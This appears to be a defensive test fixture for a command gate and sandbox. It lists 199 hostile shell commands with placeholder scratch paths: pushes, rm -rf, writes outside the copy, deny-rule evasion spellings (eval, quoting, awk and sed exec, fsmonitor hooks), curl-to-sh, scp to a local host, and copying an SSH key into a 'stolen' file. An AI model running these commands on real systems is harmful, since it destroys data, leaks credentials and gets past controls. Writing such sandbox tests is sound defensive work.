---
dispatch_id: threat
real_paths:
  - id: RP1
    path: "none (threat fixture for gate3-check.sh rerun)"
    run: "bash gate3-sandbox-proof.sh"
---
# Gate 3 threat handoff (fixture, re-plan p3-y6-replan-1)

Every row below tries to push, tag, delete, write outside the copy, read a secret or reach the network, in the spellings found by the review rounds (groups a, b, c), Blake's 162 deny rows (group d) and the classes only an environment can stop (group e).
Placeholders are replaced by `gate3-sandbox-proof.sh` with scratch paths before anything runs: @REAL@ (scratch repo), @REMOTE@ (scratch bare remote), @VICTIM@ (scratch dir with files), @CANARY@ (empty scratch dir), @FAKEHOME@ (scratch HOME holding .ssh/id_gate3_canary). The cell after the AC id is the group; `ctl` marks a filesystem row that also runs in the proof's control run (without the sandbox) and must have an effect there. Never run this file with the placeholders unsubstituted against a real repository.

## 9.1 Spec Compliance Checklist
| # | Acceptance Criterion | Verification Type | Verification Method | Expected Evidence |
|---|---|---|---|---|
| AC1 | a ctl | post-impl | R1 | an exit number, no effect outside the copy |
| AC2 | a ctl | post-impl | R2 | an exit number, no effect outside the copy |
| AC3 | a ctl | post-impl | R3 | an exit number, no effect outside the copy |
| AC4 | a ctl | post-impl | R4 | an exit number, no effect outside the copy |
| AC5 | a | post-impl | R5 | an exit number, no effect outside the copy |
| AC6 | b ctl | post-impl | R6 | an exit number, no effect outside the copy |
| AC7 | b ctl | post-impl | R7 | an exit number, no effect outside the copy |
| AC8 | b ctl | post-impl | R8 | an exit number, no effect outside the copy |
| AC9 | b | post-impl | R9 | an exit number, no effect outside the copy |
| AC10 | b ctl | post-impl | R10 | an exit number, no effect outside the copy |
| AC11 | c ctl | post-impl | R11 | an exit number, no effect outside the copy |
| AC12 | c ctl | post-impl | R12 | an exit number, no effect outside the copy |
| AC13 | c ctl | post-impl | R13 | an exit number, no effect outside the copy |
| AC14 | c ctl | post-impl | R14 | an exit number, no effect outside the copy |
| AC15 | c ctl | post-impl | R15 | an exit number, no effect outside the copy |
| AC16 | c ctl | post-impl | R16 | an exit number, no effect outside the copy |
| AC17 | c ctl | post-impl | R17 | an exit number, no effect outside the copy |
| AC18 | c ctl | post-impl | R18 | an exit number, no effect outside the copy |
| AC19 | d | post-impl | R19 | an exit number, no effect outside the copy |
| AC20 | d | post-impl | R20 | an exit number, no effect outside the copy |
| AC21 | d | post-impl | R21 | an exit number, no effect outside the copy |
| AC22 | d | post-impl | R22 | an exit number, no effect outside the copy |
| AC23 | d | post-impl | R23 | an exit number, no effect outside the copy |
| AC24 | d | post-impl | R24 | an exit number, no effect outside the copy |
| AC25 | d | post-impl | R25 | an exit number, no effect outside the copy |
| AC26 | d | post-impl | R26 | an exit number, no effect outside the copy |
| AC27 | d | post-impl | R27 | an exit number, no effect outside the copy |
| AC28 | d | post-impl | R28 | an exit number, no effect outside the copy |
| AC29 | d | post-impl | R29 | an exit number, no effect outside the copy |
| AC30 | d | post-impl | R30 | an exit number, no effect outside the copy |
| AC31 | d | post-impl | R31 | an exit number, no effect outside the copy |
| AC32 | d | post-impl | R32 | an exit number, no effect outside the copy |
| AC33 | d | post-impl | R33 | an exit number, no effect outside the copy |
| AC34 | d | post-impl | R34 | an exit number, no effect outside the copy |
| AC35 | d | post-impl | R35 | an exit number, no effect outside the copy |
| AC36 | d | post-impl | R36 | an exit number, no effect outside the copy |
| AC37 | d | post-impl | R37 | an exit number, no effect outside the copy |
| AC38 | d | post-impl | R38 | an exit number, no effect outside the copy |
| AC39 | d | post-impl | R39 | an exit number, no effect outside the copy |
| AC40 | d | post-impl | R40 | an exit number, no effect outside the copy |
| AC41 | d | post-impl | R41 | an exit number, no effect outside the copy |
| AC42 | d | post-impl | R42 | an exit number, no effect outside the copy |
| AC43 | d | post-impl | R43 | an exit number, no effect outside the copy |
| AC44 | d | post-impl | R44 | an exit number, no effect outside the copy |
| AC45 | d | post-impl | R45 | an exit number, no effect outside the copy |
| AC46 | d | post-impl | R46 | an exit number, no effect outside the copy |
| AC47 | d | post-impl | R47 | an exit number, no effect outside the copy |
| AC48 | d | post-impl | R48 | an exit number, no effect outside the copy |
| AC49 | d | post-impl | R49 | an exit number, no effect outside the copy |
| AC50 | d | post-impl | R50 | an exit number, no effect outside the copy |
| AC51 | d | post-impl | R51 | an exit number, no effect outside the copy |
| AC52 | d | post-impl | R52 | an exit number, no effect outside the copy |
| AC53 | d | post-impl | R53 | an exit number, no effect outside the copy |
| AC54 | d | post-impl | R54 | an exit number, no effect outside the copy |
| AC55 | d | post-impl | R55 | an exit number, no effect outside the copy |
| AC56 | d | post-impl | R56 | an exit number, no effect outside the copy |
| AC57 | d | post-impl | R57 | an exit number, no effect outside the copy |
| AC58 | d | post-impl | R58 | an exit number, no effect outside the copy |
| AC59 | d | post-impl | R59 | an exit number, no effect outside the copy |
| AC60 | d | post-impl | R60 | an exit number, no effect outside the copy |
| AC61 | d | post-impl | R61 | an exit number, no effect outside the copy |
| AC62 | d | post-impl | R62 | an exit number, no effect outside the copy |
| AC63 | d | post-impl | R63 | an exit number, no effect outside the copy |
| AC64 | d | post-impl | R64 | an exit number, no effect outside the copy |
| AC65 | d | post-impl | R65 | an exit number, no effect outside the copy |
| AC66 | d | post-impl | R66 | an exit number, no effect outside the copy |
| AC67 | d | post-impl | R67 | an exit number, no effect outside the copy |
| AC68 | d | post-impl | R68 | an exit number, no effect outside the copy |
| AC69 | d | post-impl | R69 | an exit number, no effect outside the copy |
| AC70 | d | post-impl | R70 | an exit number, no effect outside the copy |
| AC71 | d | post-impl | R71 | an exit number, no effect outside the copy |
| AC72 | d | post-impl | R72 | an exit number, no effect outside the copy |
| AC73 | d | post-impl | R73 | an exit number, no effect outside the copy |
| AC74 | d | post-impl | R74 | an exit number, no effect outside the copy |
| AC75 | d | post-impl | R75 | an exit number, no effect outside the copy |
| AC76 | d | post-impl | R76 | an exit number, no effect outside the copy |
| AC77 | d | post-impl | R77 | an exit number, no effect outside the copy |
| AC78 | d | post-impl | R78 | an exit number, no effect outside the copy |
| AC79 | d | post-impl | R79 | an exit number, no effect outside the copy |
| AC80 | d | post-impl | R80 | an exit number, no effect outside the copy |
| AC81 | d | post-impl | R81 | an exit number, no effect outside the copy |
| AC82 | d | post-impl | R82 | an exit number, no effect outside the copy |
| AC83 | d | post-impl | R83 | an exit number, no effect outside the copy |
| AC84 | d | post-impl | R84 | an exit number, no effect outside the copy |
| AC85 | d | post-impl | R85 | an exit number, no effect outside the copy |
| AC86 | d | post-impl | R86 | an exit number, no effect outside the copy |
| AC87 | d | post-impl | R87 | an exit number, no effect outside the copy |
| AC88 | d | post-impl | R88 | an exit number, no effect outside the copy |
| AC89 | d | post-impl | R89 | an exit number, no effect outside the copy |
| AC90 | d | post-impl | R90 | an exit number, no effect outside the copy |
| AC91 | d | post-impl | R91 | an exit number, no effect outside the copy |
| AC92 | d | post-impl | R92 | an exit number, no effect outside the copy |
| AC93 | d | post-impl | R93 | an exit number, no effect outside the copy |
| AC94 | d | post-impl | R94 | an exit number, no effect outside the copy |
| AC95 | d | post-impl | R95 | an exit number, no effect outside the copy |
| AC96 | d | post-impl | R96 | an exit number, no effect outside the copy |
| AC97 | d | post-impl | R97 | an exit number, no effect outside the copy |
| AC98 | d | post-impl | R98 | an exit number, no effect outside the copy |
| AC99 | d | post-impl | R99 | an exit number, no effect outside the copy |
| AC100 | d | post-impl | R100 | an exit number, no effect outside the copy |
| AC101 | d | post-impl | R101 | an exit number, no effect outside the copy |
| AC102 | d | post-impl | R102 | an exit number, no effect outside the copy |
| AC103 | d | post-impl | R103 | an exit number, no effect outside the copy |
| AC104 | d | post-impl | R104 | an exit number, no effect outside the copy |
| AC105 | d | post-impl | R105 | an exit number, no effect outside the copy |
| AC106 | d | post-impl | R106 | an exit number, no effect outside the copy |
| AC107 | d | post-impl | R107 | an exit number, no effect outside the copy |
| AC108 | d | post-impl | R108 | an exit number, no effect outside the copy |
| AC109 | d | post-impl | R109 | an exit number, no effect outside the copy |
| AC110 | d | post-impl | R110 | an exit number, no effect outside the copy |
| AC111 | d | post-impl | R111 | an exit number, no effect outside the copy |
| AC112 | d | post-impl | R112 | an exit number, no effect outside the copy |
| AC113 | d | post-impl | R113 | an exit number, no effect outside the copy |
| AC114 | d | post-impl | R114 | an exit number, no effect outside the copy |
| AC115 | d | post-impl | R115 | an exit number, no effect outside the copy |
| AC116 | d | post-impl | R116 | an exit number, no effect outside the copy |
| AC117 | d | post-impl | R117 | an exit number, no effect outside the copy |
| AC118 | d | post-impl | R118 | an exit number, no effect outside the copy |
| AC119 | d | post-impl | R119 | an exit number, no effect outside the copy |
| AC120 | d | post-impl | R120 | an exit number, no effect outside the copy |
| AC121 | d | post-impl | R121 | an exit number, no effect outside the copy |
| AC122 | d | post-impl | R122 | an exit number, no effect outside the copy |
| AC123 | d | post-impl | R123 | an exit number, no effect outside the copy |
| AC124 | d | post-impl | R124 | an exit number, no effect outside the copy |
| AC125 | d | post-impl | R125 | an exit number, no effect outside the copy |
| AC126 | d | post-impl | R126 | an exit number, no effect outside the copy |
| AC127 | d | post-impl | R127 | an exit number, no effect outside the copy |
| AC128 | d | post-impl | R128 | an exit number, no effect outside the copy |
| AC129 | d | post-impl | R129 | an exit number, no effect outside the copy |
| AC130 | d | post-impl | R130 | an exit number, no effect outside the copy |
| AC131 | d | post-impl | R131 | an exit number, no effect outside the copy |
| AC132 | d | post-impl | R132 | an exit number, no effect outside the copy |
| AC133 | d | post-impl | R133 | an exit number, no effect outside the copy |
| AC134 | d | post-impl | R134 | an exit number, no effect outside the copy |
| AC135 | d | post-impl | R135 | an exit number, no effect outside the copy |
| AC136 | d | post-impl | R136 | an exit number, no effect outside the copy |
| AC137 | d | post-impl | R137 | an exit number, no effect outside the copy |
| AC138 | d | post-impl | R138 | an exit number, no effect outside the copy |
| AC139 | d | post-impl | R139 | an exit number, no effect outside the copy |
| AC140 | d | post-impl | R140 | an exit number, no effect outside the copy |
| AC141 | d | post-impl | R141 | an exit number, no effect outside the copy |
| AC142 | d | post-impl | R142 | an exit number, no effect outside the copy |
| AC143 | d | post-impl | R143 | an exit number, no effect outside the copy |
| AC144 | d | post-impl | R144 | an exit number, no effect outside the copy |
| AC145 | d | post-impl | R145 | an exit number, no effect outside the copy |
| AC146 | d | post-impl | R146 | an exit number, no effect outside the copy |
| AC147 | d | post-impl | R147 | an exit number, no effect outside the copy |
| AC148 | d | post-impl | R148 | an exit number, no effect outside the copy |
| AC149 | d | post-impl | R149 | an exit number, no effect outside the copy |
| AC150 | d | post-impl | R150 | an exit number, no effect outside the copy |
| AC151 | d | post-impl | R151 | an exit number, no effect outside the copy |
| AC152 | d | post-impl | R152 | an exit number, no effect outside the copy |
| AC153 | d | post-impl | R153 | an exit number, no effect outside the copy |
| AC154 | d | post-impl | R154 | an exit number, no effect outside the copy |
| AC155 | d | post-impl | R155 | an exit number, no effect outside the copy |
| AC156 | d | post-impl | R156 | an exit number, no effect outside the copy |
| AC157 | d | post-impl | R157 | an exit number, no effect outside the copy |
| AC158 | d | post-impl | R158 | an exit number, no effect outside the copy |
| AC159 | d | post-impl | R159 | an exit number, no effect outside the copy |
| AC160 | d | post-impl | R160 | an exit number, no effect outside the copy |
| AC161 | d | post-impl | R161 | an exit number, no effect outside the copy |
| AC162 | d | post-impl | R162 | an exit number, no effect outside the copy |
| AC163 | d | post-impl | R163 | an exit number, no effect outside the copy |
| AC164 | d | post-impl | R164 | an exit number, no effect outside the copy |
| AC165 | d | post-impl | R165 | an exit number, no effect outside the copy |
| AC166 | d | post-impl | R166 | an exit number, no effect outside the copy |
| AC167 | d | post-impl | R167 | an exit number, no effect outside the copy |
| AC168 | d | post-impl | R168 | an exit number, no effect outside the copy |
| AC169 | d | post-impl | R169 | an exit number, no effect outside the copy |
| AC170 | d | post-impl | R170 | an exit number, no effect outside the copy |
| AC171 | d | post-impl | R171 | an exit number, no effect outside the copy |
| AC172 | d | post-impl | R172 | an exit number, no effect outside the copy |
| AC173 | d | post-impl | R173 | an exit number, no effect outside the copy |
| AC174 | d | post-impl | R174 | an exit number, no effect outside the copy |
| AC175 | d | post-impl | R175 | an exit number, no effect outside the copy |
| AC176 | d | post-impl | R176 | an exit number, no effect outside the copy |
| AC177 | d | post-impl | R177 | an exit number, no effect outside the copy |
| AC178 | d | post-impl | R178 | an exit number, no effect outside the copy |
| AC179 | d | post-impl | R179 | an exit number, no effect outside the copy |
| AC180 | d | post-impl | R180 | an exit number, no effect outside the copy |
| AC181 | e ctl | post-impl | R181 | an exit number, no effect outside the copy |
| AC182 | e ctl | post-impl | R182 | an exit number, no effect outside the copy |
| AC183 | e ctl | post-impl | R183 | an exit number, no effect outside the copy |
| AC184 | e ctl | post-impl | R184 | an exit number, no effect outside the copy |
| AC185 | e | post-impl | R185 | an exit number, no effect outside the copy |
| AC186 | e | post-impl | R186 | an exit number, no effect outside the copy |
| AC187 | e | post-impl | R187 | an exit number, no effect outside the copy |
| AC188 | e | post-impl | R188 | an exit number, no effect outside the copy |
| AC189 | e | post-impl | R189 | an exit number, no effect outside the copy |
| AC190 | e ctl | post-impl | R190 | an exit number, no effect outside the copy |
| AC191 | e ctl | post-impl | R191 | an exit number, no effect outside the copy |
| AC192 | e ctl | post-impl | R192 | an exit number, no effect outside the copy |
| AC193 | e ctl | post-impl | R193 | an exit number, no effect outside the copy |
| AC194 | e ctl | post-impl | R194 | an exit number, no effect outside the copy |
| AC195 | e ctl | post-impl | R195 | an exit number, no effect outside the copy |
| AC196 | e ctl | post-impl | R196 | an exit number, no effect outside the copy |
| AC197 | e ctl | post-impl | R197 | an exit number, no effect outside the copy |
| AC198 | e | post-impl | R198 | an exit number, no effect outside the copy |
| AC199 | e | post-impl | R199 | an exit number, no effect outside the copy |

Raw commands:
```
R1: git  push origin main
R2: git -C . push origin main
R3: rm -fr @VICTIM@
R4: git tag -a v1 -m x
R5: npm  publish --dry-run
R6: sed -ie s/a/PWNED/ README.md
R7: T=$(mktemp -d); mkdir -p "$T/.tad"; echo "touch @REAL@/cdpwn; git -C @REAL@ push @REMOTE@ main" > "$T/.tad/x.sh"; cd "$T"; bash .tad/x.sh
R8: awk 'BEGIN{c="touch @CANARY@/awk1"; print 1 | c}'
R9: sed 's|a|b|e' README.md
R10: git grep -Otouch\ @CANARY@/pg -e a
R11: find @VICTIM@ -dele{te,te}
R12: git diff --out{put,}=@CANARY@/c5 HEAD
R13: git grep -O'touch @CANARY@/c2; echo' -e a
R14: git grep --open-files-in-p='touch @CANARY@/c4b;' -e a
R15: sed -I '' s/keep/GONE/ @VICTIM@/f.txt
R16: sed -n 'w@CANARY@/c9' README.md
R17: awk 'BEGIN{c="touch @CANARY@/c10"; print "x" | c}'
R18: sort --outp=@CANARY@/c15 README.md
R19: git push origin main
R20: git  push origin main
R21: git	push origin main
R22: git -C . push origin main
R23: git -C @REAL@ push origin main
R24: git -c core.x=y push origin main
R25: git --git-dir=@REAL@/.git push origin main
R26: git --no-pager push origin main
R27: git push --force origin main
R28: git push @REMOTE@ main
R29: git tag v1
R30: git tag -a v1 -m x
R31: git  tag -a v2 -m x
R32: git tag -d v1
R33: git branch newbranch
R34: git branch -D main
R35: git commit --allow-empty -m x
R36: git reset --hard HEAD
R37: git clean -fdx
R38: git checkout -b other
R39: git stash
R40: git remote add o2 @REMOTE@
R41: git config user.name x
R42: git fetch @REMOTE@
R43: git pull origin main
R44: git merge main
R45: git rebase main
R46: git update-ref refs/tags/zz HEAD
R47: git gc
R48: git rm -f canary.txt
R49: git mv canary.txt c2.txt
R50: git -P log
R51: git show --output=@REAL@/canary.txt HEAD
R52: git log --output=@REAL@/canary.txt
R53: git diff --output=@REAL@/canary.txt
R54: npm publish
R55: npm  publish --dry-run
R56: npm install left-pad
R57: yarn publish
R58: pnpm publish
R59: gh release create v1
R60: gh  release delete v1
R61: gh pr merge 1
R62: gh api -X POST /repos/x/y/issues
R63: rm -rf @VICTIM@
R64: rm -fr @VICTIM@
R65: rm -r -f @VICTIM@
R66: rm -f -r @VICTIM@
R67: rm --recursive --force @VICTIM@
R68: rm @VICTIM@/keep.txt
R69: /bin/rm -rf @VICTIM@
R70: command rm -rf @VICTIM@
R71: \rm -rf @VICTIM@
R72: "rm" -rf @VICTIM@
R73: r""m -rf @VICTIM@
R74: rmdir @VICTIM@
R75: unlink @VICTIM@/keep.txt
R76: mv @VICTIM@ @CANARY@/moved
R77: cp /dev/null @VICTIM@/keep.txt
R78: truncate -s 0 @VICTIM@/keep.txt
R79: find @VICTIM@ -delete
R80: find @VICTIM@ -exec rm -rf {} +
R81: find @VICTIM@ -type f -exec sh -c 'rm -f {}' ;
R82: sed -i.bak s/a/b/ @REAL@/canary.txt
R83: sed -i '' s/a/b/ @REAL@/canary.txt
R84: sed -n 'w @CANARY@/sedout.txt' @REAL@/canary.txt
R85: sed 's/a/b/w @CANARY@/sedout2.txt' @REAL@/canary.txt
R86: sed -n '1e git push origin main' @REAL@/canary.txt
R87: awk 'BEGIN{system("rm -rf @VICTIM@")}'
R88: awk 'BEGIN{print "x" > "@CANARY@/awkout.txt"}'
R89: awk 'BEGIN{"git push origin main" | getline x}'
R90: awk 'BEGIN{print "git push origin main" | "sh"}'
R91: sort -o @REAL@/canary.txt @REAL@/canary.txt
R92: tee @REAL@/canary.txt < /dev/null
R93: echo pwned > @REAL@/canary.txt
R94: echo pwned >> @REAL@/canary.txt
R95: echo pwned > @CANARY@/new.txt
R96: echo pwned >@VICTIM@/keep.txt
R97: cat /dev/null > @REAL@/canary.txt
R98: : > @REAL@/canary.txt
R99: echo x 2> @REAL@/canary.txt
R100: echo x &> @REAL@/canary.txt
R101: echo x >& @REAL@/canary.txt
R102: echo x 3> @REAL@/canary.txt
R103: cat <<< "x" > @REAL@/canary.txt
R104: ls > @REAL@/canary.txt
R105: exec 3> @REAL@/canary.txt
R106: sh -c 'git push origin main'
R107: bash -c "git push origin main"
R108: bash -c 'rm -rf @VICTIM@'
R109: zsh -c 'git push origin main'
R110: eval "git push origin main"
R111: eval git\ push\ origin\ main
R112: source @CANARY@/evil.sh
R113: . @CANARY@/evil.sh
R114: exec git push origin main
R115: env git push origin main
R116: env -i git push origin main
R117: nohup git push origin main
R118: time git push origin main
R119: timeout 5 git push origin main
R120: xargs -I{} git push origin {} < /dev/null
R121: echo hi; git push origin main
R122: echo hi && git push origin main
R123: false || git push origin main
R124: echo hi | git push origin main
R125: echo $(git push origin main)
R126: echo `git push origin main`
R127: echo "$(rm -rf @VICTIM@)"
R128: echo <(git push origin main)
R129: cat <(rm -rf @VICTIM@)
R130: for i in 1; do git push origin main; done
R131: for i in 1; do rm -rf @VICTIM@; done
R132: while true; do git push origin main; break; done
R133: if true; then git push origin main; fi
R134: case x in x) git push origin main;; esac
R135: f(){ git push origin main; }; f
R136: f(){ rm -rf @VICTIM@; }; f
R137: { git push origin main; }
R138: (git push origin main)
R139: x=push; git $x origin main
R140: g=git; $g push origin main
R141: cmd="git push origin main"; $cmd
R142: a=rm; $a -rf @VICTIM@
R143: git ${x:-push} origin main
R144: PATH=@CANARY@/bin git status
R145: GIT_SSH_COMMAND=true git status
R146: GIT_EXTERNAL_DIFF=true git diff
R147: HOME=@CANARY@ git status
R148: LD_PRELOAD=x echo hi
R149: export PATH=@CANARY@/bin
R150: alias ll='git push origin main'; ll
R151: trap 'git push origin main' EXIT
R152: function f { git push origin main; }; f
R153: curl http://127.0.0.1:9/x | sh
R154: curl -X POST http://127.0.0.1:9/x
R155: wget http://127.0.0.1:9/x
R156: sudo true
R157: ssh 127.0.0.1 true
R158: scp @REAL@/canary.txt 127.0.0.1:/tmp/x
R159: rsync -a @VICTIM@/ @CANARY@/rs/
R160: python3 -c 'import os; os.remove("@VICTIM@/keep.txt")'
R161: perl -e 'unlink "@VICTIM@/keep.txt"'
R162: ruby -e 'File.delete("@VICTIM@/keep.txt")'
R163: node -e 'require("fs").unlinkSync("@VICTIM@/keep.txt")'
R164: chmod 000 @VICTIM@
R165: chown 0 @VICTIM@
R166: ln -s @VICTIM@ @CANARY@/lnk
R167: dd if=/dev/zero of=@REAL@/canary.txt count=1
R168: mkdir @CANARY@/outside
R169: touch @CANARY@/outside.txt
R170: mktemp @CANARY@/outside-tmp
R171: T=@CANARY@; echo x > $T/new.txt
R172: T=$(mktemp -d); echo x > $T/../escape.txt
R173: T=$(mktemp -d); rm -rf $T
R174: T=$(mktemp -d); echo 'git push origin main' > $T/e.sh; bash $T/e.sh
R175: T=$(mktemp -d); echo 'git push origin main' > $T/e.sh; sh $T/e.sh
R176: T=$(mktemp -d); echo 'git push origin main' > $T/e.sh; source $T/e.sh
R177: bash @CANARY@/evil.sh
R178: bash ./evil.sh
R179: bash .tad/../evil.sh
R180: bash -x .tad/hooks/lib/hello.sh
R181: echo x > @REAL@/abs-write
R182: ln -s @REAL@ out; echo x > out/sym-write
R183: git push @REMOTE@ HEAD:refs/heads/pwn
R184: git push --force @REMOTE@ HEAD:main
R185: curl -sS -m 5 https://example.com
R186: git push https://example.invalid/x.git HEAD
R187: cat @FAKEHOME@/.ssh/id_gate3_canary
R188: security find-generic-password -s gate3-proof-nonexistent
R189: open -g https://example.invalid
R190: git config core.fsmonitor 'touch @CANARY@/fsm'; git status
R191: cp -R . @CANARY@/copy
R192: git -C @REAL@ tag leak1
R193: rm -rf @REAL@/README.md
R194: echo x >> @REAL@/.git/config
R195: touch @CANARY@/chk
R196: git --git-dir=@REMOTE@ update-ref refs/heads/pwn3 refs/heads/main
R197: mkdir @VICTIM@/newdir
R198: cat @FAKEHOME@/.ssh/id_gate3_canary > @CANARY@/stolen
R199: ls @FAKEHOME@/.ssh
```
